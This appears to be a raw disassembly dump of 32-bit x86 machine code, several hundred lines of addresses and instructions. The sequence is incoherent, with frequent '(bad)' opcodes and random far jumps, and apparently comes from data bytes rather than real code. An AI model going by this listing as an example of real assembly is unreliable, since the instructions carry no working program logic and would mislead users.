  425fb6:	inc    esp
  425fb7:	aam    0x9d
  425fb9:	add    BYTE PTR [eax],al
  425fbb:	call   DWORD PTR [edi+edi*8-0x7640395b]
  425fc2:	dec    esp
  425fc4:	outs   dx,BYTE PTR ds:[esi]
  425fc5:	mov    edx,eax
  425fc7:	int3   
  425fc8:	test   DWORD PTR [eax],eax
  425fca:	inc    DWORD PTR [eax]
  425fcc:	stc    
  425fcd:	jmp    FWORD PTR [ecx+0xffb78d]
  425fd3:	add    BYTE PTR [ecx-0x2acf9601],cl
  425fd9:	dec    esp
  425fdb:	dec    DWORD PTR [edi+edi*8-0x3e]
  425fdf:	or     eax,0xffffff54
  425fe4:	ins    DWORD PTR es:[edi],dx
  425fe5:	add    bl,ah
  425fe7:	add    al,0x4
  425fe9:	mov    edi,edi
  425feb:	add    ch,al
  425fed:	add    BYTE PTR [esi+0x79],bh
  425ff0:	out    0xff,al
  425ff2:	cmp    edi,0xffffffbf
  425ff5:	mov    DWORD PTR [ebp+0x5a],edi
  425ff8:	xchg   DWORD PTR [eax],eax
  425ffa:	mov    DWORD PTR [eax],eax
  425ffc:	mov    DWORD PTR [eax],0xff92313a
  426002:	add    ah,cl
  426004:	xchg   esp,eax
  426005:	call   DWORD PTR [esi]
  426007:	mov    esp,0x89ffffcd
  42600c:	push   es
  42600d:	int3   
  42600e:	bound  ecx,QWORD PTR [edi-0x760000e5]
  426014:	add    DWORD PTR [ebx-0xfb2688],eax
  42601a:	dec    esp
  42601c:	cmp    bh,bh
  42601e:	cmp    DWORD PTR [eax],edi
  426020:	(bad)  
  426022:	inc    DWORD PTR [eax]
  426024:	inc    esi
  426025:	call   FWORD PTR [edi-0x7a]
  426028:	jnp    0x425fad
  42602a:	inc    DWORD PTR [ebx+0xcfdff30]
  426030:	loope  0x426031
  426032:	(bad)  
  426033:	call   DWORD PTR [eax+0x35518600]
  426039:	inc    DWORD PTR [ebx-0x25ff9d00]
  42603f:	(bad)  
  426041:	or     esp,0x0
  426044:	repnz add BYTE PTR [edi+ebx*2],bh
  426048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426049:	mov    edi,edi
  42604b:	add    cl,cl
  42604d:	add    BYTE PTR [ecx-0x7c00d14f],ch
  426053:	push   ebx
  426055:	call   FWORD PTR [ebx]
  426057:	aaa    
  426058:	pushf  
  426059:	(bad)  
  42605a:	(bad)  
  42605b:	jmp    edx
  42605d:	call   FWORD PTR [esi-0x5c]
  426060:	xor    edi,edi
  426062:	add    BYTE PTR [eax],al
  426064:	scas   al,BYTE PTR es:[edi]
  426065:	add    BYTE PTR [esi],ch
  426067:	daa    
  426068:	test   eax,0xf8cccccc
  42606d:	dec    DWORD PTR [ecx-0x75]
  426070:	push   edx
  426071:	cmp    edi,0xffffffff
  426074:	jmp    0x426075
  426076:	idiv   BYTE PTR [ebx+edx*4]
  426079:	add    bh,bh
  42607b:	xor    DWORD PTR ds:0x95ba3bff,0xffffffff
  426082:	inc    DWORD PTR [eax]
  426084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426085:	int3   
  426086:	adc    DWORD PTR ds:[edx+0x47ff00ff],edi
  42608d:	(bad)  
  42608e:	fbld   TBYTE PTR [edx+0x2]
  426091:	inc    DWORD PTR [eax]
  426093:	jmp    DWORD PTR [edi-0x1]
  426096:	std    
  426097:	jbe    0x4260e5
  426099:	(bad)  
  42609a:	inc    DWORD PTR [eax]
  42609c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42609d:	call   DWORD PTR [ebx]
  42609f:	jecxz  0x426103
  4260a1:	inc    DWORD PTR [eax]
  4260a3:	dec    DWORD PTR [edx+0x6a2e48cc]
  4260a9:	inc    DWORD PTR [eax]
  4260ab:	int3   
  4260ac:	xchg   bh,bh
  4260ae:	enter  0x19e4,0xff
  4260b2:	add    BYTE PTR [ebx+0x7644ff4c],al
  4260b8:	sbb    BYTE PTR [eax],al
  4260ba:	(bad)  
  4260bb:	call   DWORD PTR [eax+0x0]
  4260be:	iret   
  4260bf:	jns    0x42606f
  4260c1:	or     DWORD PTR [ecx+0x43ff7200],0x42
  4260c8:	mov    bl,0x83
  4260ca:	(bad)  
  4260cb:	call   FWORD PTR [esi-0x32799c01]
  4260d1:	add    DWORD PTR [eax],0xffffffff
  4260d4:	or     al,0x0
  4260d6:	adc    eax,0xcc89d926
  4260db:	push   esp
  4260dd:	add    BYTE PTR [ebp+0xe0cd],ch
  4260e3:	inc    DWORD PTR [edi+edi*8]
  4260e6:	sub    eax,0x83ff25c0
  4260eb:	(bad)  
  4260ec:	fdivp  st(7),st
  4260ee:	daa    
  4260ef:	xchg   ebx,eax
  4260f0:	inc    WORD PTR [eax]
  4260f3:	add    BYTE PTR [esi],bl
  4260f5:	mov    edx,edx
  4260f7:	mov    BYTE PTR [esi-0x30ffff01],0x0
  4260fe:	xor    DWORD PTR [ecx-0x7c00ffd4],esp
  426104:	or     al,0xff
  426106:	data16 mov ah,0x4d
  426109:	add    BYTE PTR [ebx-0x747c1e01],al
  42610f:	daa    
  426110:	lods   al,BYTE PTR ds:[esi]
  426111:	or     esp,0xffffff83
  426114:	cs add bl,dl
  426117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426118:	pop    DWORD PTR [ebx+0xf583cc]
  42611e:	push   ecx
  42611f:	cmp    esi,DWORD PTR [eax]
  426121:	add    bh,bh
  426123:	call   DWORD PTR [eax]
  426125:	int3   
  426126:	lea    ecx,[edi+0xcc75]
  42612c:	xor    bh,bh
  42612e:	dec    ebp
  42612f:	jnp    0x426182
  426131:	inc    DWORD PTR [eax]
  426133:	jmp    FWORD PTR [edi+edi*8-0x46]
  426137:	pop    ss
  426138:	push   0x98838300
  42613d:	dec    DWORD PTR [esi]
  42613f:	adc    esi,DWORD PTR ds:0xe200ffff
  426145:	jmp    FWORD PTR [edx-0xe]
  426148:	test   edi,edi
  42614a:	inc    DWORD PTR [eax]
  42614c:	jg     0x42614e
  42614e:	mov    eax,ds:0xffff02f7
  426153:	(bad)  
  426154:	mov    edx,0x965f4689
  426159:	inc    DWORD PTR [eax]
  42615b:	add    BYTE PTR [esi-0x34],dl
  42615e:	test   al,0x7d
  426160:	scas   al,BYTE PTR es:[edi]
  426161:	add    bh,bh
  426163:	inc    DWORD PTR [eax-0x4f6ba101]
  426169:	add    BYTE PTR [ecx-0x4f002200],cl
  42616f:	jnp    0x42613d
  426171:	int3   
  426172:	add    BYTE PTR [ecx+0xc62ff09],cl
  426178:	outs   dx,DWORD PTR ds:[esi]
  426179:	(bad)  
  42617a:	dec    esp
  42617c:	(bad)  
  42617d:	jmp    DWORD PTR [ecx]
  42617f:	push   edi
  426180:	pop    edx
  426181:	inc    DWORD PTR [eax]
  426183:	int3   
  426184:	jne    0x426186
  426186:	dec    ebx
  426187:	xor    al,0x15
  426189:	mov    DWORD PTR [ebx+0x77ffa3ff],eax
  42618f:	rol    edi,1
  426191:	dec    esp
  426193:	mov    ebp,ecx
  426195:	and    DWORD PTR [edx-0x7600f7a9],0xffffffff
  42619c:	push   ebx
  42619d:	xor    edi,0x55
  4261a0:	push   ebp
  4261a1:	or     esp,0xffffffff
  4261a4:	fdiv   st(7),st
  4261a6:	adc    ah,cl
  4261a8:	sar    bh,0x0
  4261ab:	int3   
  4261ac:	sbb    esp,ecx
  4261ae:	cs (bad) 
  4261b0:	xchg   ecx,eax
  4261b1:	(bad)  
  4261b2:	inc    DWORD PTR [ebx-0x4b6ffcd]
  4261b8:	mov    bh,bh
  4261ba:	inc    DWORD PTR [eax]
  4261bc:	or     al,0xff
  4261be:	jns    0x4261cb
  4261c0:	inc    DWORD PTR fs:[eax]
  4261c3:	dec    DWORD PTR [ebp+0x0]
  4261c6:	shr    DWORD PTR [edi],1
  4261c8:	mov    ebp,0x4a000000
  4261cd:	add    BYTE PTR [eax],ah
  4261cf:	xchg   BYTE PTR [edi-0x7cff0100],bl
  4261d5:	call   esi
  4261d7:	mov    dl,0xe7
  4261d9:	dec    DWORD PTR [ecx+0x36ff8b00]
  4261df:	xchg   esp,eax
  4261e0:	scas   al,BYTE PTR es:[edi]
  4261e1:	add    BYTE PTR [eax],al
  4261e3:	adc    DWORD PTR [edi+0x7f92a3ff],0xffffffff
  4261ea:	add    bh,bh
  4261ec:	sbb    eax,0xd8c8b2ff
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	dec    DWORD PTR [eax-0xd119301]
  4261f9:	(bad)  
  4261fa:	inc    DWORD PTR [eax]
  4261fc:	xchg   ebx,eax
  4261fd:	int3   
  4261fe:	sub    al,0xb4
  426200:	jne    0x426201
  426202:	add    DWORD PTR [ebx-0x48d0030],0xffffff81
  426209:	cmp    edi,0x0
  42620c:	sbb    edi,edi
  42620e:	fsubr  st,st(7)
  426210:	cmp    eax,0xcb8300ff
  426215:	int3   
  426216:	add    bl,BYTE PTR [ecx+0x7d]
  426219:	int3   
  42621a:	cmp    edi,0x4e
  42621d:	add    BYTE PTR [edi+0x6b],dl
  426220:	xor    eax,0xb800ffff
  426225:	push   esp
  426227:	arpl   WORD PTR [edi+edi*8+0xe5ff00],bx
  42622e:	xlat   BYTE PTR ds:[ebx]
  42622f:	lods   eax,DWORD PTR ds:[esi]
  426230:	cmp    bh,bh
  426232:	cmp    edi,0x52
  426235:	int3   
  426236:	das    
  426237:	es mov ecx,0xdcff0083
  42623d:	inc    ecx
  42623f:	in     eax,dx
  426240:	add    eax,0x5bffff83
  426245:	int3   
  426246:	pop    ds
  426247:	icebp  
  426248:	(bad)  
  42624a:	(bad)  
  42624b:	jmp    DWORD PTR [edi+edi*8]
  42624e:	ins    DWORD PTR es:[edi],dx
  42624f:	std    
  426250:	ret    0x8989
  426253:	xor    DWORD PTR [ecx+0x0],0xffffff9e
  426257:	in     al,0xbb
  426259:	cmp    edi,0xffffffff
  42625c:	adc    al,BYTE PTR [eax]
  42625e:	fdiv   st,st(0)
  426260:	jne    0x426261
  426262:	mov    edi,edi
  426264:	or     al,0xcc
  426266:	xchg   esp,eax
  426267:	xchg   esi,eax
  426268:	sub    esp,ecx
  42626a:	add    bh,bh
  42626c:	pop    ss
  42626d:	add    ch,bl
  42626f:	iret   
  426270:	push   edx
  426271:	add    bh,bh
  426273:	cmp    edx,0xffffffff
  426276:	test   al,0xb9
  426278:	pop    eax
  426279:	add    BYTE PTR [eax],al
  42627b:	mov    DWORD PTR [edi+0x2789e7ff],edx
  426281:	(bad)  
  426282:	(bad)  
  426283:	jmp    DWORD PTR [edx+0x62e57eff]
  426289:	add    BYTE PTR [eax],al
  42628b:	(bad)  
  42628c:	mov    edi,0x10e9bcff
  426291:	dec    esp
  426293:	call   FWORD PTR [ebx+0x19f24dff]
  426299:	inc    DWORD PTR [ebx+0xd003089]
  42629f:	jmp    0xffde:0x83ff00bb
  4262a6:	xchg   esp,eax
  4262a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262a8:	sahf   
  4262a9:	(bad)  
  4262aa:	dec    DWORD PTR [ecx-0x53c3ffd0]
  4262b0:	jns    0x4262b1
  4262b2:	(bad)  
  4262b3:	(bad)  
  4262b4:	fcos   
  4262b6:	mov    eax,ds:0xff479d
  4262bb:	jmp    ecx
  4262bd:	add    BYTE PTR [ebp+0xff05bd],ah
  4262c3:	add    BYTE PTR [edx+0x0],dl
  4262c6:	pop    edx
  4262c7:	mov    bh,0xc5
  4262c9:	(bad)  
  4262ca:	(bad)  
  4262cb:	push   DWORD PTR [ecx-0x1]
  4262ce:	xor    ecx,DWORD PTR [edx+0xff0045]
  4262d4:	test   al,0x83
  4262d6:	test   BYTE PTR [esi-0x5f],ch
  4262d9:	int3   
  4262da:	mov    edi,edi
  4262dc:	push   edi
  4262dd:	(bad)  
  4262de:	fldln2 
  4262e0:	test   BYTE PTR [eax],al
  4262e2:	inc    DWORD PTR [eax]
  4262e4:	test   DWORD PTR [ebx-0x70c065],0x83fc83ff
  4262ee:	adc    BYTE PTR [ebp-0xffe8],cl
  4262f4:	mov    dl,0xff
  4262f6:	popf   
  4262f7:	scas   eax,DWORD PTR es:[edi]
  4262f8:	iret   
  4262f9:	add    bh,bh
  4262fb:	add    BYTE PTR [eax],al
  4262fd:	add    BYTE PTR [edi+ebp*4+0x6e],ah
  426301:	(bad)  
  426302:	dec    esp
  426304:	fadd   DWORD PTR [eax]
  426306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426307:	dec    edx
  426308:	xchg   ebp,eax
  426309:	int3   
  42630a:	mov    DWORD PTR [eax],eax
  42630c:	hlt    
  42630d:	mov    DWORD PTR [eax-0xffca25],ebp
  426313:	cmp    DWORD PTR [esi-0x1],0x75
  426317:	ins    DWORD PTR es:[edi],dx
  426318:	pop    ecx
  426319:	add    bh,bh
  42631b:	inc    ebp
  42631d:	xor    DWORD PTR [edx+0x6],0xffffffc4
  426321:	add    DWORD PTR [eax],0x0
  426324:	fisttp QWORD PTR [ecx+0xd9f7ee]
  42632a:	(bad)  
  42632b:	jmp    DWORD PTR [esi+0x4c381bff]
  426331:	int3   
  426332:	int3   
  426333:	mov    DWORD PTR [ecx],edx
  426335:	mov    eax,edx
  426337:	icebp  
  426338:	retf   
  426339:	dec    esp
  42633b:	call   FWORD PTR [ecx-0x15839001]
  426341:	int3   
  426342:	inc    DWORD PTR [eax]
  426344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426345:	mov    eax,ecx
  426347:	shl    BYTE PTR [ebp-0x77],1
  42634a:	add    DWORD PTR [eax],0xfffffffb
  42634d:	add    cl,ah
  42634f:	mov    edx,0xfffff5
  426354:	add    BYTE PTR [bx-0x36],bh
  426358:	(bad)  
  426359:	int3   
  42635a:	inc    DWORD PTR [eax]
  42635c:	in     eax,0x0
  42635e:	xor    BYTE PTR [ebp+edi*8+0x0],bh
  426362:	mov    edi,edi
  426364:	std    
  426365:	int3   
  426366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426367:	sahf   
  426368:	std    
  426369:	add    bh,bh
  42636b:	mov    ecx,eax
  42636d:	mov    DWORD PTR [ebp-0xff903c],eax
  426373:	jmp    DWORD PTR [ebx-0x1]
  426376:	mov    ebp,edi
  426378:	ret    0xccff
  42637b:	call   FWORD PTR [ebx]
  42637d:	add    BYTE PTR [eax],bl
  42637f:	dec    ecx
  426380:	push   ds
  426381:	(bad)  
  426382:	(bad)  
  426383:	push   DWORD PTR ds:0xd8ac3d00
  426389:	dec    DWORD PTR [ecx+0x4800cc00]
  42638f:	in     al,dx
  426390:	enter  0x89ff,0xff
  426394:	repnz mov DWORD PTR [eax-0xff5857],eax
  42639b:	or     DWORD PTR [edi-0x1],0xd
  42639f:	cs mov ecx,0x22ff83ff
  4263a5:	add    BYTE PTR [esi-0xc],dl
  4263a8:	push   es
  4263a9:	dec    esp
  4263ab:	push   DWORD PTR [edi-0x1]
  4263ae:	add    ch,BYTE PTR [edx+0xffffa8]
  4263b4:	mov    ebp,0xb9d1e2ff
  4263b9:	mov    edi,edi
  4263bb:	int3   
  4263bc:	cmp    edi,edi
  4263be:	xor    BYTE PTR [edx-0x69],bl
  4263c1:	mov    esp,ecx
  4263c3:	int3   
  4263c4:	xchg   BYTE PTR [eax],al
  4263c6:	in     al,0x62
  4263c8:	cld    
  4263c9:	(bad)  
  4263ca:	(bad)  
  4263cb:	jmp    FWORD PTR [edx-0x34]
  4263ce:	scas   al,BYTE PTR es:[edi]
  4263cf:	jecxz  0x426394
  4263d1:	inc    DWORD PTR [eax]
  4263d3:	mov    DWORD PTR [ecx-0x1],ecx
  4263d6:	mov    BYTE PTR [eax],bh
  4263d8:	cmp    DWORD PTR [eax],eax
  4263da:	mov    edi,edi
  4263dc:	inc    esp
  4263dd:	dec    DWORD PTR ds:0xffffdaa0
  4263e3:	add    BYTE PTR [eax-0x7d],ah
  4263e6:	push   esi
  4263e7:	ja     0x426467
  4263e9:	add    DWORD PTR [eax],0x0
  4263ec:	mov    bl,0xff
  4263ee:	je     0x42644c
  4263f0:	push   0xd400ffff
  4263f5:	add    BYTE PTR ds:0xff834442,ah
  4263fb:	add    DWORD PTR [edi+0x0],0xb
  4263ff:	mov    al,ds:0xcc00ffaf
  426404:	leave  
  426405:	add    cl,bh
  426407:	mov    ?,ebp
  426409:	(bad)  
  42640a:	inc    DWORD PTR [eax]
  42640c:	dec    edx
  42640d:	jmp    FWORD PTR [eax-0x9]
  426410:	fdiv   st(7),st
  426412:	dec    esp
  426414:	push   0x76aa9483
  426419:	add    BYTE PTR [eax],al
  42641b:	call   ebx
  42641d:	adc    DWORD PTR [edi-0x9],0x67
  426421:	cmp    edi,0xffffffff
  426424:	mov    ch,0xff
  426426:	ins    BYTE PTR es:[edi],dx
  426427:	ja     0x42646e
  426429:	(bad)  
  42642a:	(bad)  
  42642b:	call   FWORD PTR [edi+edi*8-0x764c9bf7]
  426432:	(bad)  
  426433:	call   DWORD PTR [ebp+0x2f2ef5ff]
  426439:	add    BYTE PTR [ebx+0x138969ff],al
  42643f:	add    BYTE PTR [esi-0x7d],dl
  426442:	int3   
  426443:	adc    DWORD PTR [edx],0xffffff83
  426446:	xor    eax,DWORD PTR [eax]
  426448:	add    edi,edi
  42644a:	add    DWORD PTR [eax],0x21
  42644d:	dec    edi
  42644f:	test   BYTE PTR [ebx],0xff
  426452:	inc    DWORD PTR [eax]
  426454:	lods   al,BYTE PTR ds:[esi]
  426455:	jmp    FWORD PTR [edi-0x2]
  426458:	loop   0x426459
  42645a:	add    BYTE PTR [eax],al
  42645c:	(bad)  
  42645d:	(bad)  
  42645e:	fidiv  WORD PTR [edx+0x44]
  426461:	add    bh,bh
  426463:	push   DWORD PTR [ebp+0x0]
  426466:	call   0x80ff:0xff8370af
  42646d:	mov    edi,esi
  42646f:	mov    eax,0xff0005
  426474:	sbb    BYTE PTR [eax],al
  426476:	cmp    DWORD PTR [ebx+0x52],0x9e000000
  42647d:	add    bl,dh
  42647f:	cs stc 
  426481:	dec    esp
  426483:	adc    DWORD PTR [ecx-0x77],0xffffffa4
  426487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426488:	push   ebx
  426489:	or     esp,0xffffff83
  42648c:	bnd jmp DWORD PTR [ebx+esi*4]
  426490:	sbb    al,BYTE PTR [eax]
  426492:	inc    DWORD PTR [eax]
  426494:	(bad)  
  426495:	(bad)  
  426496:	cmp    ecx,DWORD PTR [ebp+0x83ffdd]
  42649c:	and    eax,DWORD PTR [ebx+0x46da8b]
  4264a2:	(bad)  
  4264a3:	(bad)  
  4264a4:	jg     0x4264a6
  4264a6:	or     DWORD PTR [ecx+0x6b],esp
  4264a9:	inc    DWORD PTR [eax]
  4264ab:	int3   
  4264ac:	xchg   edi,edi
  4264ae:	scas   eax,DWORD PTR es:[edi]
  4264af:	ss push esi
  4264b1:	add    bh,bh
  4264b3:	add    BYTE PTR [ebx-0x4aa05901],cl
  4264b9:	(bad)  
  4264ba:	inc    DWORD PTR [eax]
  4264bc:	test   BYTE PTR [eax],al
  4264be:	jmp    0x42645a
  4264c0:	test   bh,bh
  4264c2:	mov    DWORD PTR [eax],eax
  4264c4:	dec    esp
  4264c5:	int3   
  4264c6:	mov    edi,0x834d40
  4264cb:	int3   
  4264cc:	mov    al,ds:0x3fca1100
  4264d1:	cmp    edi,0xffffffff
  4264d4:	fisttp WORD PTR [ecx-0x7ccb86a8]
  4264da:	(bad)  
  4264db:	(bad)  
  4264dc:	stc    
  4264dd:	add    BYTE PTR [ecx-0x51f4],al
  4264e3:	call   DWORD PTR [eax+0x3bfc1bcc]
  4264e9:	(bad)  
  4264ea:	inc    DWORD PTR [eax]
  4264ec:	ins    BYTE PTR es:[edi],dx
  4264ed:	push   DWORD PTR [ebx+eax*2+0x37]
  4264f1:	inc    DWORD PTR [eax]
  4264f3:	dec    DWORD PTR ds:0xbca39fff
  4264f9:	inc    DWORD PTR [ebx-0x9009601]
  4264ff:	(bad)  
  426500:	out    0xff,eax
  426502:	add    BYTE PTR [ebx+0x2605ff61],al
  426508:	into   
  426509:	(bad)  
  42650a:	(bad)  
  42650b:	call   DWORD PTR [esi+0x5beafb83]
  426511:	inc    DWORD PTR [eax]
  426513:	add    bh,dh
  426515:	dec    DWORD PTR [edi+0x7b]
  426518:	push   esi
  426519:	add    bh,bh
  42651b:	add    BYTE PTR [edi-0x1],dh
  42651e:	icebp  
  42651f:	and    ecx,DWORD PTR [ebx+0x0]
  426522:	or     esp,0xffffffa4
  426525:	jmp    FWORD PTR [edx]
  426527:	mov    edi,0x83ffb3
  42652c:	mov    esi,0x6a05d400
  426531:	(bad)  
  426532:	inc    DWORD PTR [eax]
  426534:	inc    esi
  426535:	(bad)  
  426536:	fcom   DWORD PTR [ecx+edi*2-0x1]
  42653a:	add    BYTE PTR [eax],al
  42653c:	dec    ebx
  42653d:	push   DWORD PTR [edx+0x48]
  426540:	mov    dh,0xff
  426542:	inc    DWORD PTR [eax]
  426544:	or     BYTE PTR [ecx+0x4fab00],0x0
  42654b:	dec    edx
  42654d:	push   DWORD PTR [edi]
  42654f:	sahf   
  426550:	int3   
  426551:	add    bh,bh
  426553:	push   DWORD PTR [ebx-0x7d]
  426556:	add    DWORD PTR [eax],esi
  426558:	jo     0x426526
  42655a:	inc    DWORD PTR [eax]
  42655c:	es int3 
  42655e:	mov    ah,0xaf
  426560:	leave  
  426561:	add    bh,bh
  426563:	dec    ebp
  426565:	mov    DWORD PTR [ebp+ecx*1-0x7cff0011],eax
  42656c:	lods   eax,DWORD PTR ds:[esi]
  42656d:	and    DWORD PTR [ecx],0xffffffa8
  426570:	lods   eax,DWORD PTR ds:[esi]
  426571:	add    bh,bh
  426573:	(bad)  
  426574:	fdivr  st,st(7)
  426576:	add    esp,DWORD PTR [ebp-0x64]
  426579:	add    BYTE PTR [eax],al
  42657b:	call   DWORD PTR [esi-0x7d]
  42657e:	xor    esi,ecx
  426580:	inc    BYTE PTR [ebx-0x7c61ff77]
  426586:	ror    BYTE PTR gs:[ebp+0xffff],cl
  42658d:	inc    ecx
  42658f:	jns    0x426542
  426591:	(bad)  
  426592:	inc    DWORD PTR [eax]
  426594:	inc    ebp
  426595:	call   ebx
  426597:	pop    esi
  426598:	sti    
  426599:	(bad)  
  42659a:	(bad)  
  42659b:	dec    DWORD PTR [eax-0x1]
  42659e:	sbb    al,0xca
  4265a0:	fcos   
  4265a2:	inc    DWORD PTR [eax]
  4265a4:	out    0xff,eax
  4265a6:	sar    BYTE PTR [ebx-0x69],1
  4265a9:	inc    DWORD PTR [ebx-0xb001c01]
  4265af:	fild   DWORD PTR [edx-0x67ffff01]
  4265b5:	dec    DWORD PTR [esi-0x7ccb3b]
  4265bb:	dec    DWORD PTR [edx]
  4265bd:	add    BYTE PTR [ebp+0x6a],cl
  4265c0:	mov    ch,0xff
  4265c2:	add    BYTE PTR [eax],al
  4265c4:	out    0x83,al
  4265c6:	(bad)  
  4265c7:	or     al,BYTE PTR [ebp+0x0]
  4265ca:	(bad)  
  4265cb:	jmp    DWORD PTR [eax-0x776d4234]
  4265d1:	add    bh,bh
  4265d3:	add    BYTE PTR [esi-0x55995b01],cl
  4265d9:	cmp    edi,0x0
  4265dc:	add    DWORD PTR [eax],0x1b
  4265df:	stc    
  4265e0:	inc    ecx
  4265e1:	add    bh,bh
  4265e3:	add    DWORD PTR [eax+0x0],0xffffffeb
  4265e7:	inc    ebp
  4265e8:	sub    edi,edi
  4265ea:	cmp    edi,0xfffffff9
  4265ed:	call   FWORD PTR [eax-0x33e0e2]
  4265f3:	add    BYTE PTR [esi-0x34],bl
  4265f6:	repz jo 0x42662e
  4265f9:	inc    DWORD PTR [eax]
  4265fb:	add    BYTE PTR [ecx-0x77],ah
  4265fe:	pop    esi
  4265ff:	jno    0x426636
  426601:	(bad)  
  426602:	inc    DWORD PTR [eax]
  426604:	mov    ebx,0x9a844ff
  426609:	int3   
  42660a:	mov    DWORD PTR [eax],eax
  42660c:	push   esi
  42660d:	call   FWORD PTR [edi-0x3c]
  426610:	add    DWORD PTR [ebx-0xf9ff01],0xffffffdd
  426617:	dec    eax
  426618:	ud0    edi,edi
  42661b:	dec    ebx
  42661d:	call   DWORD PTR [edx]
  42661f:	cs dec edx
  426621:	add    BYTE PTR [eax],al
  426623:	call   FWORD PTR [ebp+0x4865ed89]
  426629:	mov    edi,edi
  42662b:	int3   
  42662c:	pop    ebx
  42662d:	jmp    DWORD PTR [edi+0xffe030]
  426633:	jmp    DWORD PTR [edi+0x0]
  426636:	add    bl,BYTE PTR [eax-0xff3311]
  42663c:	xchg   esp,eax
  42663d:	cmp    ebx,0x74
  426640:	popa   
  426641:	add    BYTE PTR [eax],al
  426643:	int3   
  426644:	mov    bh,bh
  426646:	hlt    
  426647:	ror    dh,0xff
  42664a:	inc    DWORD PTR [ebx-0x12afff30]
  426650:	in     eax,0xff
  426652:	add    BYTE PTR [ebx+0x442ff9e],al
  426658:	add    eax,0xe60083ff
  42665d:	add    BYTE PTR [esi-0x4b],bh
  426660:	ds dec esp
  426663:	mov    DWORD PTR [ebx-0x1],ebx
  426666:	pusha  
  426667:	push   edi
  426668:	call   0xcc42e9f6
  42666d:	int3   
  42666e:	pop    ss
  42666f:	bound  eax,QWORD PTR [ecx+0xcc8300]
  426675:	inc    DWORD PTR [edi+0x78]
  426678:	add    BYTE PTR ss:[eax],al
  42667b:	int3   
  42667c:	pop    ebp
  42667d:	mov    DWORD PTR [ebx+0x7],ecx
  426680:	xor    al,0xff
  426682:	(bad)  
  426683:	inc    esp
  426685:	xor    DWORD PTR [edi-0x59],0x0
  426689:	add    ah,cl
  42668b:	adc    DWORD PTR [ecx],0x0
  42668e:	adc    ebp,DWORD PTR [edx]
  426690:	add    eax,DWORD PTR [eax]
  426692:	int3   
  426693:	add    BYTE PTR [ecx-0x1],al
  426696:	out    dx,al
  426697:	test   al,0xd3
  426699:	add    bh,bh
  42669b:	push   esp
  42669d:	int3   
  42669e:	mov    ch,0xe9
  4266a0:	inc    eax
  4266a1:	inc    DWORD PTR [ebx-0x6000417d]
  4266a7:	cmp    eax,0x83ffccd4
  4266ac:	mov    dl,0x0
  4266ae:	cmc    
  4266af:	(bad)  [esi-0x7d]
  4266b2:	add    bh,bh
  4266b4:	out    dx,eax
  4266b5:	(bad)  
  4266b6:	mov    eax,0xccfffef1
  4266bb:	call   DWORD PTR [esi]
  4266bd:	add    BYTE PTR [esp+esi*8-0x6d],bh
  4266c1:	(bad)  
  4266c2:	dec    esp
  4266c4:	jno    0x4266c5
  4266c6:	imul   DWORD PTR [edi+ebp*8+0x5589ffff]
  4266cd:	int3   
  4266ce:	jae    0x4266ee
  4266d0:	cmp    al,BYTE PTR [eax]
  4266d2:	inc    DWORD PTR [ebx-0x663733ed]
  4266d8:	scas   eax,DWORD PTR es:[edi]
  4266d9:	int3   
  4266da:	(bad)  
  4266db:	(bad)  
  4266dc:	jmp    0x51cdae0
  4266e1:	add    bh,bh
  4266e3:	add    ah,bh
  4266e5:	add    BYTE PTR [edi+0xff40ba],ch
  4266eb:	mov    DWORD PTR [edi-0x3bf19301],eax
  4266f1:	add    DWORD PTR [eax],0xffffffff
  4266f4:	test   eax,0x1dd31eff
  4266f9:	add    DWORD PTR [eax],0x0
  4266fc:	scas   al,BYTE PTR es:[edi]
  4266fd:	sub    DWORD PTR [eax],0xfffffff2
  426700:	popa   
  426701:	int3   
  426702:	dec    DWORD PTR [ecx+0x7772ffda]
  426708:	inc    edx
  426709:	(bad)  
  42670a:	inc    DWORD PTR [eax]
  42670c:	sub    DWORD PTR [ebx-0xe5cb2a],eax
  426712:	add    DWORD PTR [eax],0x52
  426715:	call   DWORD PTR [ebx-0x7c00bd8d]
  42671b:	push   edi
  42671d:	sbb    DWORD PTR [ebx-0xff9563],0xffffffff
  426724:	dec    ebp
  426725:	push   DWORD PTR [ebx+eiz*8-0x7600005f]
  42672c:	test   DWORD PTR [eax],0xcc06ba75
  426732:	(bad)  
  426733:	push   DWORD PTR [esi-0x1f2f5a01]
  426739:	(bad)  
  42673a:	inc    DWORD PTR [eax]
  42673c:	pop    ebp
  42673d:	push   DWORD PTR [eax-0xfff8eb]
  426743:	call   FWORD PTR [edx-0x48c1cc7d]
  426749:	cmp    edi,0x0
  42674c:	mov    dl,0xff
  42674e:	cmp    BYTE PTR [eax+ebp*1-0x42000001],0x0
  426756:	push   0x832098
  42675b:	add    BYTE PTR [edx+0x0],bl
  42675e:	xor    eax,0x83003c53
  426763:	inc    DWORD PTR [eax-0x23faa100]
  426769:	(bad)  
  42676a:	(bad)  
  42676b:	call   DWORD PTR [edx-0xc84fd01]
  426771:	add    BYTE PTR [eax],al
  426773:	add    BYTE PTR [ecx+0x4d634900],ah
  426779:	add    ah,cl
  42677b:	dec    DWORD PTR [esi]
  42677d:	cmp    DWORD PTR [edx-0x7cffb7ff],0x0
  426784:	add    BYTE PTR [ebx-0x9c4a00],0xff
  42678b:	call   FWORD PTR [edi-0x1]
  42678e:	pusha  
  42678f:	addr16 push ds
  426791:	(bad)  
  426792:	dec    esp
  426794:	pop    es
  426795:	dec    DWORD PTR [ebx-0x7c00fdf2]
  42679b:	add    dl,bl
  42679d:	call   FWORD PTR [eax]
  42679f:	ret    0x831b
  4267a2:	cmp    edi,0xffffffbe
  4267a5:	add    BYTE PTR [ecx+0x1d],dl
  4267a8:	mov    ecx,0xe0cc0083
  4267ad:	add    DWORD PTR [esi+0x9],0x2a
  4267b1:	mov    DWORD PTR [eax],eax
  4267b3:	jmp    DWORD PTR [ebx+0x1447b8ff]
  4267b9:	cmp    edi,0x0
  4267bc:	cli    
  4267bd:	jmp    FWORD PTR [ecx+ebp*2]
  4267c0:	xor    bh,bh
